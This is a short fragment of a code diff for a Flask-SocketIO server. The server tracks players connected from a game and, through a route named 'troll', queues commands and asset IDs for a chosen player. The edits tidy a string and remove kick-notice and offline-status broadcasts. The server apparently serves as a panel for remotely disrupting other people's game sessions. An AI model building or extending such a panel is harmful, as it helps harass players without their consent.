                 add_history("connect", username, f"Connected from {d.get('game', 'Unknown')}")
@@ -464,7 +405,7 @@ def troll():
     cmd = data.get("cmd", "")
     if uid and cmd:
         cmd_data = {"cmd": cmd}
-        details = f"{cmd.upper()}"
+        details = cmd.upper()
         if "assetId" in data:
             cmd_data["assetId"] = data["assetId"]
             details += f" (Asset: {data['assetId']})"
@@ -477,7 +418,6 @@ def troll():
         pending_commands[uid] = cmd_data
         name = connected_players.get(uid, {}).get("username", "Unknown")
         add_history("action", name, details)
-        socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
     return jsonify({"sent": True})
 
 def broadcast_loop():
@@ -497,7 +437,6 @@ def broadcast_loop():
         for uid in to_remove:
             username = connected_players.pop(uid, {}).get("username", "Unknown")
             add_history("disconnect", username, "Disconnected")
-            socketio.emit("status", {"username": username, "online": False})
         socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
         socketio.sleep(2)
 
@@ -505,4 +444,3 @@ if __name__ == "__main__":
     load_history()
     socketio.start_background_task(broadcast_loop)
     socketio.run(app, host="0.0.0.0", port=5000)
-
